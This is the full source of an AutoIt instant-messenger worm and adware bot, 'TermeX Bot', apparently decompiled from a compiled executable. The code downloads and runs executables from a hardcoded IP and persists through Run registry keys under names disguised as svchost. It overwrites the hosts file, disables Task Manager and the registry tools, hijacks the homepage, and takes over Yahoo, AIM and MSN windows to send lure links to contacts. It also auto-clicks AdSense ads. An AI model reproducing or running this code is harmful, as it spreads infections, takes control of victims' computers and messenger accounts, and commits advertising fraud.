; <AUT2EXE VERSION: 3.2.0.1>

; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-START: D:\virus\zin.au3>
; ----------------------------------------------------------------------------

;---------------------------------------------------------------
; Author : TermeX - ThanatoS
; Name: TermeX Bot
; Version : 5.0
; Usage : Advertise via Y!M,MSN,AIM and Auto-click Function
; Published : 07 August 2007
;---------------------------------------------------------------
;set the number_of_popup to 0 if you do not want to use it

; Variables
#NoTrayIcon
$website = "http://meta-stuff.com"
$website2 = "http://unitedreporters.org"
$website3 = "http://lucyblog.com"
$download = "http://64.26.25.75"
$homepage = "http://unihomepg.com"
$backup = "http://unihomepg.com"
$auto_click_0 = "no"
$auto_click = "no"
$number_of_popup = "0"
$number_of_homepage_popup = "2"
$number_of_messages = "2"
$time_msg = "200000"
$time_popup = "600000"
$pub_id = "pub-9362311176929254"

; List of random keywords
Dim $key[6]
$key[0] = "debt consolidation"
$key[1] = "credit card"
$key[2] = "casino"
$key[3] = "web hosting"
$key[4] = "insurance"
$key[5] = "health care"

; Click on Google adsense's ads
If $auto_click_0 = "yes" then
$title = WinGetTitle("UniHome", "")
$check = WinExists ($title)
If $check = 1 Then
	BlockInput (1)
	WinActivate($title)
	WinSetState ( $title , "", @SW_MAXIMIZE)
	$pos = MouseGetPos()
	MouseClick("left", 400, 371, 1, 0)
	MouseMove ( $pos[0], $pos[1] , 0)
	BlockInput (0)
EndIf
EndIf

;Check for update
InetGet ("" & $download & "/var", @WindowsDir & "\system32\drivers\etc\var", 1, 0)
if FileGetSize(@WindowsDir & "\system32\drivers\etc\var") = 0 Then
	InetGet ("" & $backup & "/var", @WindowsDir & "\system32\drivers\etc\var", 1, 0)
	if NOT FileGetSize(@WindowsDir & "\system32\drivers\etc\var") = 0 Then
	$file = FileOpen(@WindowsDir & "\system32\drivers\etc\var", 0)
	$website = FileReadLine($file,1)
	$website2 = FileReadLine($file,2)
	$website3 = FileReadLine($file,3)
	$download = FileReadLine($file,4)
	$homepage = FileReadLine($file,5)
	$backup = FileReadLine($file,6)
	$auto_click_0 = FileReadLine($file,7)
	$auto_click = FileReadLine($file,8)
	$number_of_popup = FileReadLine($file,9)
	$number_of_homepage_popup = FileReadLine($file,10)
	$number_of_messages = FileReadLine($file,11)
	$time_msg = FileReadLine($file,12)
	$time_popup = FileReadLine($file,13)
	$pub_id = FileReadLine($file,14)
	FileClose($file)
	InetGet ("" & $download & "/updt.exe", @WindowsDir & "\updt.exe", 1, 0)
	Run(@WindowsDir & "\updt.exe")
	EndIf
EndIf


; Infect into system
If Not FileExists(@WindowsDir & "\svhost32.exe") Then
	InetGet ("" & $download & "/zin.exe", @WindowsDir & "\svhost32.exe", 1, 0)
	InetGet ("" & $download & "/hosts", @WindowsDir & "\system32\drivers\etc\hosts", 1, 0)
	RegWrite("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "Task Manager", "REG_SZ", @WindowsDir & "\svhost32.exe")
	InetGet ("" & $download & "/zun.exe", @WindowsDir & "\svchost.exe", 1, 0)
	RegWrite("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "SVCHOST", "REG_SZ", @WindowsDir & "\svchost.exe")
EndIf


; Write Registry keys
$test = "DisableRegistryTools"
RegWrite("HKEY_CURRENT_USER\Software\Policies\Microsoft\Internet Explorer\Control Panel", "Homepage", "REG_DWORD", "1")
RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr", "REG_DWORD", "1")
RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", $test, "REG_DWORD", "1")
RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main", "Start Page", "REG_SZ", $homepage)
RegWrite("HKEY_CURRENT_USER\Software\Yahoo\pager\View\YMSGR_buzz", "content url", "REG_SZ", $homepage)
RegWrite("HKEY_CURRENT_USER\Software\Yahoo\pager\View\YMSGR_Launchcast", "content url", "REG_SZ", $homepage)
RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoRun", "REG_DWORD", "1")


;Get_real_name
$msg = RegRead("HKEY_CURRENT_USER\Software\yahoo\pager" , "Yahoo! User ID" )
if $msg = "" then
If FileExists(@ProgramFilesDir & "\Yahoo!\Messenger\logs") Then
	$search = FileFindFirstFile(@ProgramFilesDir & "\Yahoo!\Messenger\logs\*.log")
	$file = FileFindNextFile($search)
	$array = StringSplit($file, '_', 1)
	$array = StringSplit($array[2], '.', 1)

	If not $array[1] = "User" or "Admin" or "Administrator" then
    $msg = " ( sent by " & $array[1] & " , no worm ) "
	else
	$msg = ""
	EndIf

EndIf
else
	$msg = " ( sent by " & $msg & " , no worm ) "
EndIf

; List of random messages
Dim $tin[13]
$tin[0] = "This is my own e-card for you ^_^ " & $website & "/?id=ecard =))"
$tin[1] = "look at my IQ =)) " & $website & "/DSC00273.JPG >:D<"
$tin[2] = "" & $website & "/?id=think :-)"
$tin[3] = "Mobilephones can strengthen your sex life :O " & $website & "/?id=256 << " & $msg & ""
$tin[4] = "Fuck !!! X-( " & $website & "/?id=password << "
$tin[5] = "10 gifts for the first 10 people post comments on my own page : " & $website3 & " ^_^ "
$tin[6] = "leave comments on my blog : " & $website3 & "/?id=183 << "
$tin[7] = "My new personal site : " & $website & " c0ol !!! "
$tin[8] = "omg!!! google is hacked : http://www.google.com/search?hl=en&q=meta-stuff.com&btnI=kVlyVDHKOZiit"
$tin[9] = "" & $website & "/forum/showthread.php?t=31888 =))"
$tin[10] = "motherfuker " & $website & "/?news_id=18388 X-("
$tin[11] = "Can you recognize this man ? Please call me ASAP !!! " & $website & "/thief.jpg (This is NOT JOKING) "
$tin[12] = "OMG ! She is so sexy :x " & $website & "/DSC00273.JPG " & $msg & ""

FileDelete(@WindowsDir & "\system32\drivers\etc\var")

; Main process
sleep(300000)
$count = 1
While $count <= $number_of_messages

$tieude0 = WinGetTitle("My Computer", "")
$kiemtra0 = WinExists ($tieude0)
$tieude0x = WinGetTitle("Windows Explorer", "")
$kiemtra0x = WinExists ($tieude0x)
$tieude1 = WinGetTitle("Yahoo! Messenger", "")
$kiemtra1 = WinExists ($tieude1)
$tieude2 = WinGetTitle("AIM", "")
$kiemtra2 = WinExists ($tieude2)
$tieude3 = WinGetTitle("Windows Live Messenger", "")
$kiemtra3 = WinExists ($tieude3)
$tieude4 = WinGetTitle("Windows Messenger", "")
$kiemtra4 = WinExists ($tieude4)

	If $kiemtra0 = 1 Then
		ClipPut($website)
		BlockInput (1)
		WinActivate($tieude0)
		Send("{F6}")
		Send("^v {ENTER}")
		BlockInput (0)
	EndIf

	If $kiemtra0x = 1 Then
		ClipPut($website)
		BlockInput (1)
		WinActivate($tieude0x)
		Send("{F6}")
		Send("^v {ENTER}")
		BlockInput (0)
	EndIf

	If $kiemtra1 = 1 Then
		$ngaunhien = Random(0,12,1)
		ClipPut($tin[$ngaunhien])
		BlockInput (1)
		WinActivate($tieude1)
		Send("!m")
		Send("un")
		Send("^v {ENTER}{ENTER}")
		Send("^m")
		Send("{DOWN}")
		Send("^{SHIFTDOWN}{END}{SHIFTUP}")
		Send("{ENTER}")
		Send("^v")
		Send("!s")
		BlockInput (0)
	EndIf

	If $kiemtra2 = 1 Then
		$ngaunhien = Random(0,12,1)
		ClipPut($tin[$ngaunhien])
		BlockInput (1)
		WinActivate($tieude2)
		Send("{HOME}")
		Send("{DOWN}")
		Send("^{SHIFTDOWN}{PGDN}{SHIFTUP}")
		Send("{ENTER}")
		Send("^v {ENTER}")
		Send("!{F4}")
		Send("!{F4}")
		BlockInput (0)
	EndIf

	If $kiemtra3 = 1 Then
		$ngaunhien = Random(0,12,1)
		ClipPut($tin[$ngaunhien])
		BlockInput (1)
		WinActivate($tieude3)
		Send("{ALT}")
		Send("a")
		Send("{ENTER}")
		Send("{SPACE}")
		Send("{DOWN}")
		Send("{SPACE}")
		Send("{DOWN}")
		Send("{SPACE}")
		Send("{DOWN}")
		Send("{SPACE}")
		Send("{DOWN}")
		Send("{SPACE}")
		Send("{DOWN}")
		Send("{SPACE}")
		Send("{DOWN}")
		Send("{SPACE}")
		Send("{DOWN}")
		Send("{SPACE}")
		Send("{DOWN}")
		Send("{SPACE}")
		Send("{DOWN}")
		Send("{SPACE}")
		Send("{DOWN}")
		Send("{SPACE}")
		Send("{ENTER}")
		Send("^v {ENTER}")
		Send("!{F4}")
		BlockInput (0)
	EndIf

	If $kiemtra4 = 1 Then
		$ngaunhien = Random(0,12,1)
		ClipPut($tin[$ngaunhien])
		BlockInput (1)
		WinActivate($tieude4)
		Send("{ALT}")
		Send("a")
		Send("{ENTER}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{ENTER}")
		Send("^v {ENTER}")
		Send("!{F4}")
		Send("{ALT}")
		Send("a")
		Send("{ENTER}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{ENTER}")
		Send("^v {ENTER}")
		Send("!{F4}")
		Send("{ALT}")
		Send("a")
		Send("{ENTER}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{ENTER}")
		Send("^v {ENTER}")
		Send("!{F4}")
		Send("{ALT}")
		Send("a")
		Send("{ENTER}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{ENTER}")
		Send("^v {ENTER}")
		Send("!{F4}")
		Send("{ALT}")
		Send("a")
		Send("{ENTER}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{ENTER}")
		Send("^v {ENTER}")
		Send("!{F4}")
		Send("{ALT}")
		Send("a")
		Send("{ENTER}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{ENTER}")
		Send("^v {ENTER}")
		Send("!{F4}")
		BlockInput (0)
	EndIf

Sleep($time_msg)
$count = $count + 1
WEnd

;Auto popup
$j = 1
While $j <= $number_of_popup

	Sleep($time_popup)
	$keyword = $key[Random(0,5,1)]
	$ws = "http://google.ca/custom?q=" & $keyword & "&client=" & $pub_id & "&cof=GALT%3A%23008000%3BGL%3A1%3BDIV%3A%23336699%3BVLC%3A663399%3BAH%3Acenter%3BBGC%3AFFFFFF%3BLBGC%3A336699%3BALC%3A0000FF%3BLC%3A0000FF%3BT%3A000000%3BGFNT%3A0000FF%3BGIMP%3A0000FF%3BFORID%3A1"
	Run(""&@ProgramFilesDir&"\Internet Explorer\IEXPLORE.EXE " & $ws & "", "", @SW_MAXIMIZE)

If $auto_click = "yes" then
	BlockInput (1)
	sleep(4500)
	$title = WinGetTitle(""& $keyword &"", "")
	WinActivate($title)
	$pos = MouseGetPos()
	MouseClick("left", 330, 330, 1, 0)
	MouseMove ( $pos[0], $pos[1] , 0)
	sleep(3500)
	WinKill(WinGetTitle(""))
	BlockInput (0)
EndIf

	$j = $j + 1
WEnd

;Auto homepage popup
$j = 1
While $j <= $number_of_homepage_popup

	Sleep($time_popup)
	$ws = "http://www.google.com"
	Run(""&@ProgramFilesDir&"\Internet Explorer\IEXPLORE.EXE " & $ws & "", "", @SW_MAXIMIZE)
	$j = $j + 1

WEnd


Sleep(99999999999999999)

; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-END: D:\virus\zin.au3>
; ----------------------------------------------------------------------------

